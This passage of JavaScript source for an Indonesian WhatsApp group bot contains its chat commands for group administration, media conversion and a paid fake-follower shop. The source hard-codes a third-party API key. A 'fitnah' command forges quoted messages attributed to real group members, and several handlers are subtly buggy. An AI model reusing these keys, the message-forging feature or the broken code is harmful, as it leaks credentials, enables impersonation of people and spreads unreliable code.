        for (let L of fetaa.data) {
          list.push({
            title: `${L.nama}`,
            rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
            description: `\n${L.desc}`
          })
        }
        const listMessage = {
          text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
          footer: '© created by GuraBot - MD',
          buttonText: "Click Here!",
          sections: [{
            title: "Sosmed Shop",
            rows: list
          }],
          listType: 1
        }
        const sendMsg = await conn.sendMessage(from, listMessage)
        break
      }
      case 'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
        if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
        if (args.length < 1) return reply(`*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|lexxy2408_\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
        let jumlah = q.split('|')[0] ? q.split('|')[0] : q
        let targ = q.split('|')[1] ? q.split('|')[1] : ''
        let idny = q.split('|')[2] ? q.split('|')[2] : ''
        var feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
        if (feta.status == false) {
          reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
        } else {
          let idpes = feta.data.order_id
          let cap = `Hai *@${sender.split('@')[0]} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! Menggunakan QRIS.\n\n*ID Pesanan :*\n${feta.data.order_id}\n\n*Target :*\n${targ}\n\n*Jumlah Order :* ${jumlah}\n*Total Harga :* Rp${toRupiah(feta.data.amount)}\n*Status Orderan :* ${feta.data.status}\n\n*info lebih lanjut?*\n*klik button dibawah.*`
          var buto = [{ buttonId: `!cekstatus ${feta.data.order_id}`, buttonText: { displayText: 'Check Status' }, type: 1 }]
          conn.sendMessage(from, { caption: cap, image: { url: feta.data.qris }, buttons: buto, footer: '© created by GuraBot - MD' })
        }
        console.log(feta)
      }
        break
      case 'chekstatus':
      case 'cekstatus': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
        if (!q) return reply('id ordernya mana kak?')
        var seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=status&order_id=${q}`)
        if (seta.status == false) {
          var captionnye = `\nid order tidak di temukan`
        } else {
          var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli jasa suntik dari kami, ditunggu next ordernya!`
        }
        reply(captionnye)
        break
      }

      // STORE FUN
      case 'shop': case 'list':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
        if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
        var arr_rows = [];
        for (let x of db_respon_list) {
          if (x.id === from) {
            arr_rows.push({
              title: x.key,
              rowId: x.key
            })
          }
        }
        var listMsg = {
          text: `Hi @${sender.split("@")[0]}`,
          buttonText: 'Click Here!',
          footer: `*List From ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
          mentions: [sender],
          sections: [{
            title: groupName, rows: arr_rows
          }]
        }
        conn.sendMessage(from, listMsg)
        break
      case 'addlist':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        var args1 = q.split("@")[0]
        var args2 = q.split("@")[1]
        if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
        if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
        addResponList(from, args1, args2, false, '-', db_respon_list)
        reply(`Berhasil menambah List menu : *${args1}*`)
        break
      case 'dellist':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
        if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
        if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
        delResponList(from, q, db_respon_list)
        reply(`Sukses delete list message dengan key *${q}*`)
        break
      case 'update':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        var args1 = q.split("@")[0]
        var args2 = q.split("@")[1]
        if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
        if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
        updateResponList(from, args1, args2, false, '-', db_respon_list)
        reply(`Berhasil update List menu : *${args1}*`)
        break
      case 'tambah':
        if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
        var num_one = q.split(' ')[0]
        var num_two = q.split(' ')[1]
        if (!num_one) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        if (!num_two) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        var nilai_one = Number(num_one)
        var nilai_two = Number(num_two)
        reply(`${nilai_one + nilai_two}`)
        break
      case 'kurang':
        if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
        var num_one = q.split(' ')[0]
        var num_two = q.split(' ')[1]
        if (!num_one) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        if (!num_two) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        var nilai_one = Number(num_one)
        var nilai_two = Number(num_two)
        reply(`${nilai_one - nilai_two}`)
        break
      case 'kali':
        if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
        var num_one = q.split(' ')[0]
        var num_two = q.split(' ')[1]
        if (!num_one) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        if (!num_two) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        var nilai_one = Number(num_one)
        var nilai_two = Number(num_two)
        reply(`${nilai_one * nilai_two}`)
        break
      case 'bagi':
        if (!q) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
        var num_one = q.split(' ')[0]
        var num_two = q.split(' ')[1]
        if (!num_one) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        if (!num_two) return reply(`Gunakan dengan cara ${prefix + command} *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`)
        var nilai_one = Number(num_one)
        var nilai_two = Number(num_two)
        reply(`${nilai_one / nilai_two}`)
        break
      case 'p': case 'proses': {
        if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
        if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
        if (!quotedMsg) return reply('Reply pesanannya!')
        mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`, [sender])
      }
        break
      case 'd': case 'done': {
        if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
        if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
        if (!quotedMsg) return reply('Reply pesanannya!')
        mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`, [sender])
      }
        break
      case 'setppbot': {
        if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
        if (!isImage && !isQuotedImage) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}\n\nSet pp panjang?\n*Ketik:*\n${prefix + command} /full`)
        var medis = await conn.downloadAndSaveMediaMessage(msg, 'image', './function/menuPath/ppbot.jpeg')
        if (args[0] == `/full`) {
          var { img } = await generateProfilePicture(medis)
          await conn.query({
            tag: 'iq',
            attrs: {
              to: botNumber,
              type: 'set',
              xmlns: 'w:profile:picture'
            },
            content: [
              {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
              }
            ]
          })
          fs.unlinkSync(medis)
          reply(`Sukses Oni-Chann~`)
        } else {
          var memeg = await conn.updateProfilePicture(botNumber, { url: medis })
          fs.unlinkSync(medis)
          reply(`Sukses Oni-Chann~`)
        }
      }
        break
      case 'git': case 'gitclone': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
        if (!q) return reply('link githubnya mana?\n*Contoh:*\n#gitclone https://github.com/Rmdhn-20/sc-v10')
        var linknya = q
        if (!regex1.test(linknya)) return reply('link salah!')
        let [, user, repo] = args[0].match(regex1) || []
        repo = repo.replace(/.git$/, '')
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`
        let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
        reply(`*Mohon tunggu, sedang mengirim repository..*`)
        conn.sendMessage(from, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: msg }).catch((err) => reply('Maaf link github yang kamu berikan di private, dan tidak bisa di jadikan file'))
      }
        break
      /*case 'badgirlserti': case 'goodgirlserti': case 'bucinserti': case 'fuckgirlserti': case 'toloserti': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`*Contoh:*\n${prefix + command} text`)
        var anu = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=SadTeams&name=${q}`)
        reply(mess.wait)
        conn.sendMessage(from, { image: anu, caption: `${command}` }, { quoted: msg }).catch((err) => reply('Maaf server LolHuman sedang down'))
      }
        break*/
      case 'fitnah':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
        var org = q.split("|")[0]
        var target = q.split("|")[1]
        var bot = q.split("|")[2]
        if (!org.startsWith('@')) return reply('Tag orangnya')
        if (!target) return reply(`Masukkan pesan target!`)
        if (!bot) return reply(`Masukkan pesan bot!`)
        var mens = parseMention(target)
        var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens } } } }
        var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` } }
        conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
        break
      case 'del':
      case 'delete':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
        if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
        conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from } })
        break
      case 'linkgrup': case 'linkgc':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
        url = 'https://chat.whatsapp.com/' + url
        reply(url)
        break
      case 'kick':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          conn.groupParticipantsUpdate(from, [number], "remove")
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          conn.groupParticipantsUpdate(from, [number], "remove")
        } else {
          reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
        }
        break
      case 'setppgrup': case 'setppgc':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!isImage && !isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
        var medigc = await conn.downloadAndSaveMediaMessage(msg, 'image', `./function/menuPath/ppgc.jpg`)
        await conn.updateProfilePicture(from, { url: medigc })
        await sleep(2000)
        reply('Sukses Oni-Chann~')
        fs.unlinkSync(media)
        break
      case 'setnamegrup': case 'setnamegc':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!q) return reply(`Kirim perintah #${command} teks`)
        await conn.groupUpdateSubject(from, q)
          .then(res => {
            reply(`Sukses`)
          }).catch(() => reply(mess.error.api))
        break
      case 'setdesc': case 'setdescription':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!q) return reply(`Kirim perintah ${command} teks`)
        await conn.groupUpdateDescription(from, q)
          .then(res => {
            reply(`Sukses`)
          }).catch(() => reply(mess.error.api))
        break
      case 'group': case 'grup':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
        if (args[0] == "close") {
          conn.groupSettingUpdate(from, 'announcement')
          reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
        } else if (args[0] == "open") {
          conn.groupSettingUpdate(from, 'not_announcement')
          reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
        } else {
          reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
        }
        break
      case 'revoke':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        await conn.groupRevokeInvite(from)
          .then(res => {
            reply(`Sukses menyetel tautan undangan grup ini`)
          }).catch(() => reply(mess.error.api))
        break
      case 'tagall':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        if (!q) return reply(`Teks?`)
        let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
        for (let mem of participants) {
          teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
        }
        conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
        break
      case 'hidetag':
      case 'h':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        let mem = [];
        groupMembers.map(i => mem.push(i.id))
        conn.sendMessage(from, { text: q ? q : '', mentions: mem })
        break
      case 'welcome': {
        if (!isGroup) return reply('Khusus Group!')
        if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return reply("Khusus admin!")
        if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
        if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
          if (isWelcome) return reply('Sudah aktif✓')
          welcomeJson.push(from)
          fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
          reply('Suksess mengaktifkan welcome di group:\n' + groupName)
        } else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
          welcomeJson.splice(from, 1)
          fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
          reply('Success menonaktifkan welcome di group:\n' + groupName)
        } else { reply('Kata kunci tidak ditemukan!') }
      }
        break
      case 'antilink': {
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
        if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
          if (isAntiLink) return reply('Antilink sudah aktif')
          antilink.push(from)
          fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
          reply('Successfully Activate Antilink In This Group')
        } else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
          if (!isAntiLink) return reply('Antilink belum aktif')
          antilink.splice(anu, 1)
          fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
          reply('Successfully Disabling Antilink In This Group')
        } else { reply('Kata kunci tidak ditemukan!') }
      }
        break
      case 'promote':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (mentionUser.length !== 0) {
          conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
            .then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
            .catch(() => reply(mess.error.api))
        } else if (isQuotedMsg) {
          conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
            .then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
            .catch(() => reply(mess.error.api))
        } else {
          reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix + command} @tag`)
        }
        break
      case 'tiktokauto': {
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
        if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
          if (isAutoDownTT) return reply('Auto download tiktok sudah aktif')
          auto_downloadTT.push(from)
          fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
          reply('Berhasil mengaktifkan auto download tiktok')
        } else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
          if (!isAutoDownTT) return reply('Auto download tiktok belum aktif')
          auto_downloadTT.splice(anu, 1)
          fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
          reply('Berhasil mematikan auto download tiktok')
        } else { reply('Kata kunci tidak ditemukan!') }
      }
        break
      case 'demote':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (mentionUser.length !== 0) {
          conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
            .then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
            .catch(() => reply(mess.error.api))
        } else if (isQuotedMsg) {
          conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
            .then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
            .catch(() => reply(mess.error.api))
        } else {
          reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix + command} @tag`)
        }
        break
      case 'infogc':
      case 'infogrup':
      case 'infogroup':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!isGroup) return reply(mess.OnlyGrup)
        let cekgcnya = `*INFO GROUP*
• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome ? "aktif" : "tidak"}
• *Antilink:* ${isAntiLink ? "aktif" : "tidak"}
• *Tiktok Auto:* ${isAutoDownTT ? "aktif" : "tidak"}`
        reply(cekgcnya)
        break
      case 'text_grup': {
        const reactionMessage = { react: { text: "🗿", key: msg.key } }
        conn.sendMessage(from, reactionMessage)
      }
        break
      case 'sound1': case 'sound2':
      case 'sound3': case 'sound4': case 'sound5': case 'sound6':
      case 'sound7': case 'sound8': case 'sound9': case 'sound10':
      case 'sound11': case 'sound12': case 'sound13': case 'sound14':
      case 'sound15': case 'sound16': case 'sound17': case 'sound18':
      case 'sound19': case 'sound20': case 'sound21': case 'sound22':
      case 'sound23': case 'sound24': case 'sound25': case 'sound26':
      case 'sound27': case 'sound28': case 'sound29': case 'sound30':
      case 'sound31': case 'sound32': case 'sound33': case 'sound34':
      case 'sound35': case 'sound36': case 'sound37': case 'sound38':
      case 'sound39': case 'sound40': case 'sound41': case 'sound42':
      case 'sound43': case 'sound44': case 'sound45': case 'sound46':
      case 'sound47': case 'sound48': case 'sound49': case 'sound50':
      case 'sound51': case 'sound52': case 'sound53': case 'sound54':
      case 'sound55': case 'sound56': case 'sound57': case 'sound58':
      case 'sound59': case 'sound60': case 'sound61': case 'sound62':
      case 'sound63': case 'sound64': case 'sound65': case 'sound66':
      case 'sound67': case 'sound68': case 'sound69': case 'sound70':
      case 'sound71': case 'sound72': case 'sound73': case 'sound74':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        var inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
        conn.sendMessage(from, { audio: inicdd, mimetype: 'audio/mpeg', ptt: true }, { quoted: msg })
        break
      /*case 'audio1': case 'audio2': case 'audio3': case 'audio4': case 'audio5': case 'audio6': case 'audio7': case 'audio8': case 'audio9': case 'audio10': case 'audio11': case 'audio12': case 'audio13': case 'audio14': case 'audio15': case 'audio16': case 'audio17': case 'audio18': case 'audio19': case 'audio20':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        conn.sendMessage(from, { audio: { url: `https://md-devs.herokuapp.com/${command}.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: msg })
        break*/
      case 'tourl': case 'upload':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender.split("@")[0]}.webp`)
          reply(mess.wait)
          let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
          var rand2 = 'sticker/' + getRandom('.webp')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var { name, url, size } = await UploadFileUgu(rand2)
          let sizeNy = bytesToSize(size)
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`
          conn.sendMessage(from, { text: teks }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
          fs.unlinkSync(rand2)
        } else if (isVideo || isQuotedVideo) {
          await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
          reply(mess.wait)
          let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
          var rand2 = 'sticker/' + getRandom('.mp4')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var { name, url, size } = await UploadFileUgu(rand2)
          let sizeNy = bytesToSize(size)
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`
          conn.sendMessage(from, { text: teks }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
          fs.unlinkSync(rand2)
        } else if (isImage || isQuotedImage) {
          var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
          reply(mess.wait)
          let buffer_up = fs.readFileSync(mediany)
          var rand2 = 'sticker/' + getRandom('.png')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var { name, url, size } = await UploadFileUgu(rand2)
          let sizeNy = bytesToSize(size)
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`
          conn.sendMessage(from, { text: teks }, { quoted: msg })
          fs.unlinkSync(mediany)
          fs.unlinkSync(rand2)
        } else if (isQuotedAudio) {
          await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
          reply(mess.wait)
          let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp3`)
          var rand2 = 'sticker/' + getRandom('.mp3')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var { name, url, size } = await UploadFileUgu(rand2)
          let sizeNy = bytesToSize(size)
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`
          conn.sendMessage(from, { text: teks }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp3`)
          fs.unlinkSync(rand2)
        } else {
          reply(`*reply audio/video/sticker/gambar dengan pesan ${prefix + command}*`)
        }
        break
      case 'tomp3':
      case 'toaudio':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isVideo || isQuotedVideo) {
          await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
          reply(mess.wait)
          var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
          let ran = './sticker/' + getRandom('.mp3')
          fs.writeFileSync(`./${ran}`, media)
          exec(`ffmpeg -i ${media} ${ran}`)
          conn.sendMessage(from, { audio: fs.readFileSync(ran), mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
          fs.unlinkSync(ran)
          fs.unlinkSync(media)
        } else {
          reply(`*Reply video dengan pesan ${prefix + command}*`)
        }
        break
      case 'base64':
      case 'base32': {
        if (!q) return reply(`Example :\n${prefix + command} ExzBot`)
        reply(mess.wait)
        var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=${command}&encode=${q}`)
        var text_encode = `*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.encode}
 *string:* ${yogi.result.string}`
        reply(text_encode)
      }
        break
      case 'debase64': {
        if (!q) return reply(`Example :\n${prefix + command} cA==`)
        reply(mess.wait)
        var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base64&decode=${q}`)
        var text_encode = `*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
        reply(text_encode)
      }
        break
      case 'debase32': {
        reply(mess.wait)
        var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base32&decode=${q}`)
        var text_encode = `*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
        reply(text_encode)
      }
        break

      // CONVERT
      case 'toimg': case 'toimage':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
          let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
          var rand1 = 'sticker/' + getRandom('.webp')
          var rand2 = 'sticker/' + getRandom('.png')
          fs.writeFileSync(`./${rand1}`, buffer)
          reply(mess.wait)
          exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
            fs.unlinkSync(`./${rand1}`)
            if (err) return reply(mess.error.api)
            conn.sendMessage(from, { caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
            fs.unlinkSync(`./${rand2}`)
            fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
          })
        } else {
          reply('*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*')
        }
        break
      case 'tomp4': case 'tovideo':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
          let buffer = `./sticker/${sender.split("@")[0]}.webp`
          reply(mess.wait)
